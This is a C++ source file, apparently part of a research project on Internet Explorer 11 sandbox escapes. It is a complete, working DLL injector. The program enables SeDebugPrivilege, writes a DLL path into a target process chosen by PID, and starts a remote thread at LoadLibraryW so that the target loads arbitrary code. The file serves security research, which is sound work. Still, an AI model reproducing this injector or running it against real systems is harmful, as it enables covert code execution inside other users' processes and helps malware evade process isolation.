// This file is part of IE11SandboxEsacapes.

// IE11SandboxEscapes is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// IE11SandboxEscapes is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with IE11SandboxEscapes.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if(!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		printf("Error 1 %d\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if(bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else
	{
		tp.Privileges[0].Attributes = 0;
	}

	if(!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("Error adjusting privilege %d\n", GetLastError());
		return FALSE;
	}

	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("Not all privilges available\n");
		return FALSE;
	}

	return TRUE;
}


int _tmain(int argc, _TCHAR* argv[])
{
	if(argc < 3)
	{
		printf("Usage: InjectDll pid PathToDll\n");
		return 1;
	}

	WCHAR path[MAX_PATH];

	GetFullPathName(argv[2], MAX_PATH, path, nullptr);
	int pid = wcstoul(argv[1], 0, 0);

	printf("Injecting DLL: %ls into PID: %d\n", path, pid);

	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);

	SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if(hProcess)
	{
		size_t strSize = (wcslen(path) + 1) * sizeof(WCHAR);		
		LPVOID pBuf = VirtualAllocEx(hProcess, 0, strSize, MEM_COMMIT, PAGE_READWRITE);
		if(pBuf == NULL)
		{
			printf("Couldn't allocate memory in process\n");
			return 1;
		}
		SIZE_T written;
		if (!WriteProcessMemory(hProcess, pBuf, path, strSize, &written))
		{
			printf("Couldn't write to process memory\n");
			return 1;
		}

		LPVOID pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW");

		if(!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pBuf, 0, NULL))
		{
			printf("Couldn't create remote thread %d\n", GetLastError());
		}
	}
	else
	{
		printf("Couldn't open process %d\n", GetLastError());
	}

	return 0;
}

